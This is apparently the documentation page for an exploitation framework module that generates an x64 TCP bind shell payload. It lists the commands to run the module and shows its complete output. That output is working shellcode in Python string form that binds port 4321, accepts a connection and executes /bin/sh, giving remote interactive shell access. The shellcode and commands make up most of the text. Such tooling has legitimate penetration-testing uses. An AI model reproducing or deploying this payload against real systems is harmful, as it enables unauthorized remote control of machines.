## Description

Module generates payload that creates interactive tcp bind shell for X64 architecture.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/x64/bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates x64 bind shell tcp payload

## Scenarios

```
rsf > use payloads/x64/bind_tcp
rsf (X64 Bind TCP) > set rport 4321
[+] rport => 4321
rsf (X64 Bind TCP) > run
[*] Running module...
[*] Generating payload
[+] Building payload for python
payload = (
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
    "\xc7\x04\x24\x02\x00\x10\xe1\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
    "\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
    "\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
    "\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
)
```
